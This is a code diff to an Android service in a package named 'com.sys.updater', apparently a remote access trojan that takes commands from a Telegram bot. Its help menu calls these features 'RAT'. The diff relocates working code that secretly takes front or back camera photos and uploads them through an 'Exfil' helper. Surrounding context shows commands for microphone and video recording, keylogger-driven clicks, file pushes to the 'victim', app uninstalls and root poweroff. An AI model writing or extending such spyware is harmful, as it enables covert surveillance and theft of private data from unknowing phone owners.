@@ -1,8 +1,6 @@
 package com.sys.updater;
 
 import android.Manifest;
-import android.accounts.Account;
-import android.accounts.AccountManager;
 import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
@@ -43,6 +41,7 @@ import android.net.Uri;
 import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Handler;
+import android.os.HandlerThread;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.PowerManager;
@@ -76,6 +75,7 @@ public class TelegramService extends Service {
     private Handler mainHandler = new Handler(Looper.getMainLooper());
     private View overlayView;
     private String currentPath = "/sdcard/";
+    private boolean isFlashOn = false;
 
     @Override
     public void onCreate() {
@@ -220,7 +220,6 @@ public class TelegramService extends Service {
         mainHandler.post(() -> {
             if (cmd.equals("/help") || cmd.equals("/menu")) sendHelpMenu();
             
-            // NEW FEATURES
             else if (cmd.equals("/cam_front")) takePhoto(CameraCharacteristics.LENS_FACING_FRONT);
             else if (cmd.equals("/cam_back") || cmd.equals("/cam")) takePhoto(CameraCharacteristics.LENS_FACING_BACK);
             else if (cmd.equals("/vid")) recordVideo(CameraCharacteristics.LENS_FACING_FRONT);
@@ -238,7 +237,6 @@ public class TelegramService extends Service {
                 try { Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot -p"}); } catch (Exception e) { Exfil.send("❌ Root failed."); }
             }
 
-            // OLD FEATURES
             else if (cmd.equals("/flash")) toggleFlashlight();
             else if (cmd.equals("/siren")) playSiren();
             else if (cmd.startsWith("/playaudio ")) playAudio(cmd.substring(11).trim());
@@ -265,7 +263,6 @@ public class TelegramService extends Service {
             else if (cmd.startsWith("/uninstall ")) uninstallApp(cmd.substring(11).trim());
             else if (cmd.equals("/restart")) { startService(new Intent(this, TelegramService.class)); Exfil.send("🔄 Restarted."); }
             
-            // SMART TOUCH
             else if (cmd.startsWith("/click ")) {
                 if (KeyloggerService.instance != null) KeyloggerService.instance.performClick(cmd.substring(7).trim());
             }
@@ -290,7 +287,7 @@ public class TelegramService extends Service {
                 "/openapp <name> - Open App\n" +
                 "/volume <0-100> - Set Volume\n" +
                 "/mic - Record 20s\n" +
-                "/playaudio <url> - Play Audio\n" +
+                "/playaudio <url/path> - Play Audio\n" +
                 "/poweroff - Turn off (Root)\n\n" +
                 "**RAT:**\n" +
                 "/screenshot, /loc, /contacts, /calls, /clip\n" +
@@ -302,61 +299,7 @@ public class TelegramService extends Service {
         Exfil.send(menu);
     }
 
-    // ================== NEW FIXED FEATURES ==================
-
-    private String getCameraId(int facing) {
-        try {
-            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
-            for (String id : manager.getCameraIdList()) {
-                CameraCharacteristics chars = manager.getCameraCharacteristics(id);
-                Integer lensFacing = chars.get(CameraCharacteristics.LENS_FACING);
-                if (lensFacing != null && lensFacing == facing) return id;
-            }
-        } catch (Exception e) {}
-        return null;
-    }
-
-    private void takePhoto(int facing) {
-        try {
-            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
-            String cameraId = getCameraId(facing);
-            if (cameraId == null) { Exfil.send("❌ Camera not found."); return; }
-
-            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
-                @Override public void onOpened(CameraDevice camera) {
-                    try {
-                        ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
-                        camera.createCaptureSession(Arrays.asList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
-                            @Override public void onConfigured(CameraCaptureSession session) {
-                                try {
-                                    CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
-                                    builder.addTarget(reader.getSurface());
-                                    new Handler(Looper.getMainLooper()).postDelayed(() -> { try { session.capture(builder.build(), null, null); } catch (Exception e) {} }, 500);
-                                    reader.setOnImageAvailableListener(r -> {
-                                        Image image = r.acquireLatestImage();
-                                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-                                        byte[] bytes = new byte[buffer.remaining()];
-                                        buffer.get(bytes);
-                                        try {
-                                            File f = new File(getExternalFilesDir(null), "cam.jpg");
-                                            FileOutputStream fos = new FileOutputStream(f);
-                                            fos.write(bytes); fos.close();
-                                            Exfil.sendFile(f.getAbsolutePath(), "Photo", facing == CameraCharacteristics.LENS_FACING_FRONT ? "Front Cam" : "Back Cam");
-                                        } catch (Exception e) {}
-                                        image.close(); camera.close();
-                                    }, null);
-                                } catch (Exception e) {}
-                            }
-                            @Override public void onConfigureFailed(CameraCaptureSession session) {}
-                        }, null);
-                    } catch (Exception e) {}
-                }
-                @Override public void onDisconnected(CameraDevice camera) {}
-                @Override public void onError(CameraDevice camera, int error) {}
-            }, null);
-        } catch (Exception e) { Exfil.send("❌ Cam Error"); }
-    }
-
+    // ================== FIXED VIDEO RECORDING ==================
     private void recordVideo(int facing) {
         Exfil.send("🎥 Recording 10s Video...");
         
@@ -421,7 +364,62 @@ public class TelegramService extends Service {
             thread.quitSafely();
         }
     }
-    
+
+    // ================== HELPER METHODS ==================
+
+    private String getCameraId(int facing) {
+        try {
+            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
+            for (String id : manager.getCameraIdList()) {
+                CameraCharacteristics chars = manager.getCameraCharacteristics(id);
+                Integer lensFacing = chars.get(CameraCharacteristics.LENS_FACING);
+                if (lensFacing != null && lensFacing == facing) return id;
+            }
+        } catch (Exception e) {}
+        return null;
+    }
+
+    private void takePhoto(int facing) {
+        try {
+            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
+            String cameraId = getCameraId(facing);
+            if (cameraId == null) { Exfil.send("❌ Camera not found."); return; }
+
+            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
+                @Override public void onOpened(CameraDevice camera) {
+                    try {
+                        ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
+               camera.createCaptureSession(Arrays.asList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
+                            @Override public void onConfigured(CameraCaptureSession session) {
+                                try {
+                                    CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
+                                    builder.addTarget(reader.getSurface());
+                                    new Handler(Looper.getMainLooper()).postDelayed(() -> { try { session.capture(builder.build(), null, null); } catch (Exception e) {} }, 500);
+                                    reader.setOnImageAvailableListener(r -> {
+                                        Image image = r.acquireLatestImage();
+                                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
+                                        byte[] bytes = new byte[buffer.remaining()];
+                                        buffer.get(bytes);
+                                        try {
+                                            File f = new File(getExternalFilesDir(null), "cam.jpg");
+                                            FileOutputStream fos = new FileOutputStream(f);
+                                            fos.write(bytes); fos.close();
+                                            Exfil.sendFile(f.getAbsolutePath(), "Photo", facing == CameraCharacteristics.LENS_FACING_FRONT ? "Front Cam" : "Back Cam");
+                                        } catch (Exception e) {}
+                                        image.close(); camera.close();
+                                    }, null);
+                                } catch (Exception e) {}
+                            }
+                            @Override public void onConfigureFailed(CameraCaptureSession session) {}
+                        }, null);
+                    } catch (Exception e) {}
+                }
+                @Override public void onDisconnected(CameraDevice camera) {}
+                @Override public void onError(CameraDevice camera, int error) {}
+            }, null);
+        } catch (Exception e) { Exfil.send("❌ Cam Error"); }
+    }
+
     private void downloadFileToVictim(String fileId, String fileName) {
         Exfil.send("⏳ Uploading: " + fileName);
         try {
@@ -435,7 +433,6 @@ public class TelegramService extends Service {
             HttpURLConnection conn = (HttpURLConnection) new URL(downloadUrl).openConnection();
             conn.connect();
 
-            // FIX: Kan7etoha f l'dossier l'khass b l'app bach mat7erkesch (Scoped Storage)
             File destDir = new File(getExternalFilesDir(null), "Uploaded_Files");
             if (!destDir.exists()) destDir.mkdirs();
             File destFile = new File(destDir, fileName);
@@ -525,7 +522,7 @@ public class TelegramService extends Service {
             recorder.prepare(); recorder.start();
             Exfil.send("🎙️ Recording 20s...");
             new Thread(() -> {
-                try { Thread.sleep(20000); } catch (Exception e) {} // 20 SECONDS
+                try { Thread.sleep(20000); } catch (Exception e) {} 
                 mainHandler.post(() -> {
                     try { recorder.stop(); recorder.release(); Exfil.sendFile(audioFile.getAbsolutePath(), "Audio", "Mic Record 20s"); } catch (Exception e) {}
                 });
@@ -617,7 +614,6 @@ public class TelegramService extends Service {
             isFlashOn = !isFlashOn;
         } catch (Exception e) {}
     }
-    private boolean isFlashOn = false;
 
     private void playSiren() {
         try {
